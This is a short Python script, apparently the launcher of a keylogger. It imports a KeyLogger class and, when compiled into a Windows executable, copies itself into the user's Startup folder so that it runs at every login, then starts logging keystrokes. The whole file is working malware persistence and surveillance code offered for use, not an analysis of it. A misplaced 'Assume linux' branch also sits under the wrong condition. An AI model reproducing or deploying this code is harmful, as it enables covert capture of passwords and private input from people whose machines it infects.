import os
import sys
import shutil
import platform
from keylogger import KeyLogger

if getattr(sys, 'frozen', False):
	if platform.system() == "Windows":
		# compiled file.exe can find itself by
		file_name = os.path.basename(sys.executable)

		# and path to py or exe
		current_path = os.path.dirname(sys.executable)
		# startup folder for user
		startup_folder_win = os.path.join(os.getenv("appdata"),"Microsoft","Windows","Start Menu","Programs","Startup")

		if current_path != startup_folder_win:
			shutil.copy2(os.path.realpath(sys.executable), startup_folder_win)
		else: # Assume linux
			pass
else:
    print("Running in dev mode... not moving to startup")

KeyLogger(10)
